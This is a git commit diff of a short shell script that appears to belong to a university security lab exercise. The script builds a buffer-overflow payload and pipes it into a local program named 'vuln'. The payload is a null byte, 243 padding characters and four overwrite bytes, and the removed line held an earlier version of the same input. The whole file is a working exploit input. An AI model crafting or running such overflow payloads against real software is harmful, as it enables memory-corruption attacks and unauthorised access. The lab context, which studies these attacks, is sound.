06ad7d1fda33354366609bfa7df6da74e369d02a
Andreas Hiropedi <s2015345@ed.ac.uk>
2023-03-27 20:03:13 +0100

    Add files via upload

--- task1.sh
+++ task1.sh
@@ -1,1 +1,5 @@
-echo -en "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe4\x88\xff\x43aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x30\xb3\xe5\xe0aaaaa" | /task1/s2015345/vuln
+#!/usr/bin/env bash
+ENTERED_PWD='\0'
+PADDING=$(printf 'a%.s' {1..243})
+ROOSTER='\xe4\x88\xff\x43'
+echo -en $ENTERED_PWD$PADDING$ROOSTER$ENTERED_PWD | /task1/s2015345/vuln
